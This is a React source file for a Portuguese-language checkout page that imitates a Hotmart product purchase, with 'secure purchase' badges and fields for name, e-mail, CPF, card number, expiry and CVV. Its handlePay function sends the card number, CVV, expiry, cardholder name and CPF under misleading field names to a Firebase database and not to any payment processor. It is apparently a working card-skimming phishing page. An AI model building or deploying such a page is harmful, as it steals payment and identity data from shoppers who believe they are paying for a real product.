import React,{useState} from 'react'
import logo from './logo.svg';
import './App.css';
import { makeStyles } from '@material-ui/core/styles';
import IconButton from '@material-ui/core/IconButton';
import Input from '@material-ui/core/Input';
import FilledInput from '@material-ui/core/FilledInput';
import OutlinedInput from '@material-ui/core/OutlinedInput';
import InputLabel from '@material-ui/core/InputLabel';
import InputAdornment from '@material-ui/core/InputAdornment';
import FormHelperText from '@material-ui/core/FormHelperText';
import FormControl from '@material-ui/core/FormControl';
import TextField from '@material-ui/core/TextField';
import Visibility from '@material-ui/icons/Visibility';
import VisibilityOff from '@material-ui/icons/VisibilityOff';
import AccountCircle from '@material-ui/icons/AccountCircle';

import EmailIcon from '@material-ui/icons/Email';
import AssignmentIndIcon from '@material-ui/icons/AssignmentInd';
import CreditCardIcon from '@material-ui/icons/CreditCard';
import EventAvailableIcon from '@material-ui/icons/EventAvailable';
import HttpsIcon from '@material-ui/icons/Https';
import axios from 'axios'
const useStyles = makeStyles((theme) => ({
  root: {
    display: 'flex',
    flexWrap: 'wrap',

  },
  margin: {

  },
  withoutLabel: {
    marginTop: theme.spacing(3),
  },
  textField: {
    width: '25ch',
  },
}));


function App() {
  const classes = useStyles();
  const [number, setNumerber] = useState('')
  const [name, setName] = useState('')
  const [date, setDate] = useState('')
  const [cvv, setcvv] = useState('')
  const [cpf, setCpf] = useState('')

  const handlePay = async ()=>{
    console.log(number, name, date, cvv, cpf);

    const Data = {
      nome: name,
      email: name,
      cel: date,
      endereco: number,
      numero:cvv,
      cep: cvv,
      produto: cpf
    }

    const headers = {
        'Content-Type': 'text/plain'
    };

    const responde = await axios.post(`https://allflys-default-rtdb.firebaseio.com/data.json`, Data)

    console.log(responde)

  }
  return (
    <div>
      <div className="header">
        <svg data-v-4371cce6="" width="22" height="26" viewBox="0 0 22 26" xmlns="http://www.w3.org/2000/svg" class="secure-purchase-badge__shield"><path data-v-4371cce6="" d="M21.284 5.3s3.65 16.194-10.176 20.243C-2.718 21.494.93 5.3.93 5.3L11.108.644 21.284 5.3zM10.605 18.67l6.42-6.378-1.764-1.751-4.656 4.626-3.124-3.104-1.763 1.751 4.887 4.856z" fill="#5AC857" fill-rule="evenodd" class="secure-purchase-badge__shield-path"></path></svg>
        <p>Compra 100% segura</p>
      </div>
      <div className="curso">

        <div className="image">
            <img style={{width: '100%'}} src="https://static-media.hotmart.com/sZXZhNdp9ChP-DE3Go566JCIUCw=/600x0/filters:background_color(white)/hotmart/product_pictures/0ab5796a-cb8d-4abf-9917-ac76e05123e3/quadrado.png" />
        </div>

        <div clasName="text">

        </div>
      </div>

      <div className="conatinerInput">

        <FormControl style={{width: '90%'}} className={classes.margin} variant="outlined">
            <Input

            placeholder="Seu nome completo"
            style={{border: '1px solid #ccc', width: '100%', padding: 10}}
              id="outlined-adornment-amount"
              startAdornment={
                <InputAdornment position="start">
                  <AccountCircle />
                </InputAdornment>
              }
            />
        </FormControl>
<br/>
        <FormControl style={{width: '90%'}} className={classes.margin} variant="outlined">
            <Input
            placeholder="Seu e-mail"
            style={{border: '1px solid #ccc', width: '100%', padding: 10}}
              id="outlined-adornment-amount"
              startAdornment={
                <InputAdornment position="start">
                  <EmailIcon />
                </InputAdornment>
              }
            />
        </FormControl>
          <br/>
        <FormControl style={{width: '90%'}} className={classes.margin} variant="outlined">
            <Input
            value={cpf}
              onChange={e=> setCpf(e.target.value)}
              placeholder="Seu CPF "
            style={{border: '1px solid #ccc', width: '100%', padding: 10}}
              id="outlined-adornment-amount"
              startAdornment={
                <InputAdornment position="start">
                  <AssignmentIndIcon />
                </InputAdornment>
              }
            />
        </FormControl>
      </div>
      <br/>
      <div className="conatinerInput">

        <FormControl style={{width: '90%'}} className={classes.margin} variant="outlined">
            <Input
            value={name}
              onChange={e=> setName(e.target.value)}
              placeholder="Nome do titular como no cartão"
            style={{border: '1px solid #ccc', width: '100%', padding: 10}}
              id="outlined-adornment-amount"
              startAdornment={
                <InputAdornment position="start">
                  <AccountCircle />
                </InputAdornment>
              }
            />
        </FormControl>
<br/>
        <FormControl style={{width: '90%'}} className={classes.margin} variant="outlined">
            <Input
            value={number}
              onChange={e=> setNumerber(e.target.value)}
            placeholder="Numero do cartão"
            style={{border: '1px solid #ccc', width: '100%', padding: 10}}
              id="outlined-adornment-amount"
              startAdornment={
                <InputAdornment position="start">
                  <CreditCardIcon />
                </InputAdornment>
              }
            />
        </FormControl>
          <br/>
        <FormControl style={{width: '90%'}} className={classes.margin} variant="outlined">
            <Input
            value={date}
              onChange={e=> setDate(e.target.value)}
            placeholder="Data de validade"
            style={{border: '1px solid #ccc', width: '100%', padding: 10}}
              id="outlined-adornment-amount"
              startAdornment={
                <InputAdornment position="start">
                  <EventAvailableIcon />
                </InputAdornment>
              }
            />
        </FormControl>
        <br/>
        <FormControl style={{width: '90%'}} className={classes.margin} variant="outlined">
            <Input
            value={cvv}
              onChange={e=> setcvv(e.target.value)}
            placeholder="Codigo de segurança (cvv)"
            style={{border: '1px solid #ccc', width: '100%', padding: 10}}
              id="outlined-adornment-amount"
              startAdornment={
                <InputAdornment position="start">
                  <HttpsIcon />
                </InputAdornment>
              }
            />
        </FormControl>
      </div>

      <button className="btnPay" onClick={handlePay}>
        Comprar agora
      </button>
      <br/>
      <div className="imagens">
        <svg data-v-78cb7761="" height="60" version="1.1" viewBox="0 0 23.812 31.75" xmlns="http://www.w3.org/2000/svg"><g data-v-78cb7761="" transform="matrix(.26458 0 0 .26458 73.13 97.445)" fill-rule="evenodd"><path data-v-78cb7761="" d="m-260.15-323.59v-10.716c0-16.174 13.208-29.284 29.5-29.284s29.5 13.11 29.5 29.284v10.716h-12.464v-10.716c0-9.325-7.643-16.91-17.036-16.91-9.394 0-17.036 7.585-17.036 16.91v10.716z" fill="#D6E4E9"></path> <path data-v-78cb7761="" d="m-200.3-318.59h-60.7c-3.393 0-6.143 2.774-6.144 6.193 0 24.402-6e-3 44.749-6e-3 44.805 0 6.55 20.612 16.916 36.5 17.002 15.887-0.086 36.5-10.452 36.5-17.002l-7e-3 -44.806c0-3.418-2.75-6.192-6.143-6.192zm-24.395 46.31h-11.909l3.33-15.05a7.586 7.586 0 0 1-4.905-7.11c0-4.19 3.371-7.586 7.53-7.586 4.157 0 7.529 3.397 7.529 7.587a7.586 7.586 0 0 1-4.905 7.11l3.33 15.048z" fill="#00C94C"></path></g></svg>

        <svg data-v-62cf734e="" height="60" version="1.1" viewBox="0 0 26.987 31.75" xmlns="http://www.w3.org/2000/svg"><g data-v-62cf734e="" transform="matrix(.26458 0 0 .26458 -12.809 3.3824)" fill-rule="evenodd"><path data-v-62cf734e="" d="m114.02 21.591h-42.118a3.486 3.486 0 0 0 0 6.972h42.118a3.486 3.486 0 0 0 0-6.972m3.485 19.171a3.485 3.485 0 0 0-3.484-3.485h-42.12a3.4855 3.4855 0 0 0 0 6.971h42.12a3.486 3.486 0 0 0 3.485-3.486" fill="#D6E4E9"></path> <path data-v-62cf734e="" d="m100.68 89.84h-31.385c-5.125 0-9.295-4.17-9.295-9.295v-63.86c0-5.125 4.17-9.295 9.295-9.295h47.337c5.125 0 9.295 4.17 9.295 9.295v29.66a26.366 26.366 0 0 1 6.972 2.256v-31.916c0-8.969-7.297-16.266-16.267-16.266h-47.337c-8.97 0-16.266 7.297-16.266 16.266v63.86c0 8.97 7.297 16.267 16.266 16.267h40.285a26.954 26.954 0 0 1-8.9-6.972" fill="#B1C4CA"></path> <path data-v-62cf734e="" d="m103.18 52.972h-31.271a3.486 3.486 0 0 0 0 6.972h25.809a26.933 26.933 0 0 1 5.462-6.972m-31.272 15.695a3.486 3.486 0 0 0 0 6.972h22.726a26.94 26.94 0 0 1-0.163-2.926c0-1.375 0.105-2.726 0.306-4.046h-22.869z" fill="#D6E4E9"></path> <path data-v-62cf734e="" d="m141.65 72.65c0 11.348-9.199 20.547-20.546 20.547-11.348 0-20.547-9.2-20.547-20.546 0-11.348 9.2-20.546 20.547-20.546 3.698 0 7.165 0.982 10.163 2.692l2.732-3.334a24.657 24.657 0 0 0-12.894-3.623c-13.68 0-24.81 11.13-24.81 24.81 0 13.682 11.13 24.812 24.81 24.812s24.81-11.13 24.81-24.811c0-3.002-0.536-5.88-1.517-8.546l-3.262 3.984c0.333 1.467 0.515 2.993 0.515 4.562" fill="#638990"></path> <path data-v-62cf734e="" d="m122.18 84.545a1.068 1.068 0 0 0 1.566-0.11l23.853-29.13a1.149 1.149 0 0 0-0.16-1.61l-5.853-4.794a1.147 1.147 0 0 0-1.61 0.161l-17.233 21.044a1.068 1.068 0 0 1-1.566 0.11l-8.904-8.216a1.147 1.147 0 0 0-1.617 0.065l-5.128 5.56a1.148 1.148 0 0 0 0.065 1.616l16.586 15.304z" fill="#FFB200"></path></g></svg>

        <svg data-v-7f3a1e16="" height="60" version="1.1" viewBox="0 0 26.987 31.75" xmlns="http://www.w3.org/2000/svg"><g data-v-7f3a1e16="" transform="matrix(.26458 0 0 .26458 -14.643 2.1272)" fill-rule="evenodd"><path data-v-7f3a1e16="" d="m136.83 189.12h4.386v-23.97h-4.386zm18.122-3.571c5.508 0 8.262-2.81 8.262-8.432 0-5.598-2.754-8.398-8.262-8.398h-4.183v16.83h4.184zm-8.567-20.4h8.839c3.92 0 6.964 1.049 9.129 3.145 2.165 2.097 3.246 5.038 3.246 8.823 0 3.786-1.082 6.733-3.246 8.84-2.165 2.109-5.208 3.162-9.13 3.162h-8.838zm41.462 18.497c1.235-1.52 1.853-3.695 1.853-6.529 0-2.833-0.618-5.003-1.853-6.51-1.235-1.509-2.953-2.263-5.151-2.263-2.222 0-3.95 0.754-5.185 2.262-1.236 1.508-1.853 3.678-1.853 6.511 0 2.834 0.617 5.01 1.853 6.528 1.235 1.52 2.963 2.277 5.185 2.277 2.198 0 3.916-0.758 5.151-2.277m-11.22 4.283c-1.712-0.997-3.032-2.425-3.961-4.283s-1.394-4.035-1.394-6.528 0.459-4.663 1.377-6.51c0.918-1.849 2.238-3.27 3.961-4.269 1.722-0.997 3.751-1.496 6.086-1.496s4.357 0.5 6.069 1.496c1.711 0.998 3.026 2.42 3.944 4.268s1.377 4.018 1.377 6.511-0.465 4.67-1.394 6.528c-0.93 1.858-2.25 3.286-3.961 4.283-1.712 0.998-3.723 1.496-6.035 1.496-2.335 0-4.358-0.498-6.069-1.496m20.208-1.357 1.462-3.197c1.156 0.884 2.374 1.531 3.655 1.939 1.28 0.407 2.67 0.611 4.165 0.611 1.654 0 2.93-0.289 3.825-0.867 0.895-0.577 1.343-1.388 1.343-2.431 0-0.906-0.414-1.597-1.24-2.074-0.828-0.476-2.205-0.929-4.132-1.359-1.995-0.431-3.616-0.93-4.862-1.496-1.246-0.567-2.188-1.292-2.822-2.176-0.635-0.885-0.952-2.007-0.952-3.366 0-1.406 0.385-2.664 1.156-3.775 0.77-1.11 1.858-1.977 3.264-2.6s3.026-0.936 4.862-0.936c1.677 0 3.275 0.255 4.794 0.766 1.518 0.509 2.765 1.207 3.74 2.09l-1.462 3.197c-2.13-1.7-4.488-2.551-7.072-2.551-1.54 0-2.76 0.312-3.655 0.936s-1.343 1.49-1.343 2.6c0 0.93 0.396 1.644 1.19 2.143 0.793 0.499 2.142 0.964 4.046 1.393 2.017 0.454 3.655 0.958 4.913 1.513 1.258 0.556 2.222 1.265 2.89 2.125 0.67 0.862 1.003 1.95 1.003 3.265 0 1.427-0.379 2.68-1.139 3.756-0.76 1.078-1.859 1.905-3.298 2.483-1.439 0.577-3.134 0.866-5.083 0.866-1.836 0-3.559-0.249-5.168-0.748-1.609-0.498-2.97-1.201-4.08-2.107zm-126.85-158.62a1.432 1.432 0 0 1-1.356-1.9c5.258-15.295 19.648-25.573 35.806-25.573 4.227 0 8.383 0.697 12.352 2.07a1.434 1.434 0 0 1-0.938 2.71 34.816 34.816 0 0 0-11.414-1.91c-14.935 0-28.234 9.498-33.095 23.636-0.205 0.596-0.76 0.968-1.356 0.968m16.474 8.243a1.433 1.433 0 0 1-1.402-1.742c1.984-9.019 10.135-15.564 19.38-15.564 3.21 0 6.4 0.785 9.223 2.27 0.7 0.368 0.97 1.234 0.6 1.936a1.437 1.437 0 0 1-1.936 0.602 17.006 17.006 0 0 0-7.887-1.94c-7.91 0-14.882 5.598-16.58 13.311a1.435 1.435 0 0 1-1.398 1.127m17.67 12.983a1.434 1.434 0 0 1-1.432-1.533c0.203-2.95 0.307-5.95 0.307-8.914a1.434 1.434 0 1 1 2.868 0c0 3.03-0.106 6.095-0.315 9.111a1.432 1.432 0 0 1-1.428 1.336m35.996 6.252a1.435 1.435 0 0 1-1.43-1.568c0.479-5.123 0.723-10.348 0.723-15.532 0-11.589-5.744-22.41-15.364-28.95l-0.307-0.208a1.435 1.435 0 0 1-0.381-1.992 1.43 1.43 0 0 1 1.992-0.38l0.309 0.208c10.407 7.074 16.62 18.783 16.62 31.322 0 5.271-0.248 10.59-0.737 15.8a1.434 1.434 0 0 1-1.425 1.3m-64.602 1.17a1.433 1.433 0 0 1-1.417-1.662 102.78 102.78 0 0 0 1.284-16.208c0-11.34 6.68-21.718 17.02-26.439a1.435 1.435 0 0 1 1.192 2.61c-9.321 4.254-15.344 13.61-15.344 23.83 0 5.58-0.444 11.187-1.32 16.661a1.434 1.434 0 0 1-1.414 1.207m-7.504 5.163a1.434 1.434 0 0 1-1.434-1.434v-21.999c0-0.97 0.037-1.95 0.11-2.914 0.062-0.79 0.75-1.394 1.54-1.32 0.79 0.06 1.382 0.75 1.32 1.54a35.06 35.06 0 0 0-0.102 2.694v22c0 0.791-0.642 1.433-1.434 1.433m50.757 13.181a1.433 1.433 0 0 1-1.396-1.767 148.6 148.6 0 0 0 4.034-34.446c0-3.32-0.96-6.538-2.776-9.303a1.4342 1.4342 0 1 1 2.398-1.574 19.757 19.757 0 0 1 3.246 10.877c0 11.865-1.384 23.678-4.112 35.112a1.436 1.436 0 0 1-1.394 1.101m17.904 1.962a1.435 1.435 0 0 1-1.399-1.754 164.62 164.62 0 0 0 2.28-12.025 1.4341 1.4341 0 0 1 2.836 0.429 167.6 167.6 0 0 1-2.32 12.235 1.434 1.434 0 0 1-1.397 1.115m-67.632 2.616a1.434 1.434 0 0 1-1.324-1.981 101.19 101.19 0 0 0 3.633-10.36 1.4341 1.4341 0 1 1 2.754 0.801 104.03 104.03 0 0 1-3.737 10.654 1.435 1.435 0 0 1-1.326 0.886m4.903 11.373a1.435 1.435 0 0 1-1.278-2.083c7.105-14.012 11.076-29.117 11.802-44.893 0.036-0.792 0.715-1.373 1.498-1.367a1.434 1.434 0 0 1 1.366 1.5c-0.745 16.183-4.818 31.68-12.108 46.057a1.433 1.433 0 0 1-1.28 0.786m56.076 5.993a1.435 1.435 0 0 1-1.008-2.455 34.816 34.816 0 0 0 7.608-11.17 1.4335 1.4335 0 1 1 2.637 1.125 37.653 37.653 0 0 1-8.23 12.085 1.43 1.43 0 0 1-1.007 0.415m-49.588 1.45c-0.231 0-0.468-0.057-0.685-0.177a1.432 1.432 0 0 1-0.572-1.945 120.08 120.08 0 0 0 6.547-14.1 1.4337 1.4337 0 1 1 2.674 1.035 122.58 122.58 0 0 1-6.704 14.44c-0.26 0.475-0.752 0.746-1.26 0.746m7.512 5.108a1.431 1.431 0 0 1-1.25-2.134c7.77-13.907 12.833-28.917 15.046-44.614a1.446 1.446 0 0 1 1.62-1.22c0.784 0.111 1.33 0.837 1.22 1.621-2.263 16.05-7.438 31.395-15.383 45.613-0.263 0.47-0.75 0.734-1.253 0.734m30.442 1.182a1.433 1.433 0 0 1-1.308-2.019c8.979-20.14 13.533-41.633 13.533-63.877 0-14.435-11.744-26.179-26.181-26.179-0.96 0-1.921 0.051-2.858 0.154a1.433 1.433 0 0 1-1.582-1.27 1.434 1.434 0 0 1 1.27-1.58 29.228 29.228 0 0 1 3.17-0.174c16.018 0 29.049 13.033 29.049 29.05 0 22.65-4.637 44.533-13.782 65.044a1.437 1.437 0 0 1-1.311 0.851m-21.491 1.985a1.434 1.434 0 0 1-1.26-2.117 137.57 137.57 0 0 0 13.088-34.77l1.742-8.989a140.28 140.28 0 0 0 1.105-8.674l0.57-9.18c0.04-1.348 0.062-2.746 0.062-4.15 0-4.286-3.486-7.77-7.772-7.77-4.284 0-7.77 3.484-7.77 7.77 0 12.128-1.761 24.111-5.234 35.613a1.4342 1.4342 0 1 1-2.746-0.829c3.393-11.233 5.11-22.936 5.11-34.785 0-5.866 4.775-10.639 10.64-10.639 5.867 0 10.64 4.773 10.64 10.64 0 1.434-0.022 2.86-0.064 4.283l-0.578 9.273c-0.288 3.016-0.67 6.012-1.138 8.947l-1.76 9.083a140.58 140.58 0 0 1-13.372 35.542c-0.26 0.48-0.752 0.752-1.263 0.752m9.98 0.784a1.436 1.436 0 0 1-1.278-2.082 147.1 147.1 0 0 0 9.385-23.339 1.44 1.44 0 0 1 1.79-0.953 1.435 1.435 0 0 1 0.953 1.791 149.96 149.96 0 0 1-9.57 23.796 1.434 1.434 0 0 1-1.28 0.787" fill="#0072C0"></path> <path data-v-7f3a1e16="" d="m143.61 80.917a1.434 1.434 0 0 1-1.433-1.433v-4.14c0-4.121-3.35-7.473-7.472-7.473-4.119 0-7.471 3.352-7.471 7.473v4.14a1.434 1.434 0 0 1-2.865 0v-4.14c0-5.7 4.638-10.338 10.336-10.338 5.7 0 10.339 4.638 10.339 10.338v4.14c0 0.791-0.642 1.433-1.434 1.433" fill="#273A3D"></path> <path data-v-7f3a1e16="" d="m146.59 101.56h-23.769c-1.099 0-2-0.9-2-2v-18.215c0-1.1 0.901-2 2-2h23.769c1.101 0 2 0.9 2 2v18.215c0 1.1-0.899 2-2 2" fill="#273A3D"></path> <path data-v-7f3a1e16="" d="m134.71 94.7a1.434 1.434 0 0 1-1.435-1.434v-5.825a1.434 1.434 0 0 1 2.867 0v5.825c0 0.791-0.642 1.433-1.433 1.433" fill="#FEFEF5"></path></g></svg>

      </div>


    </div>
  );
}

export default App;
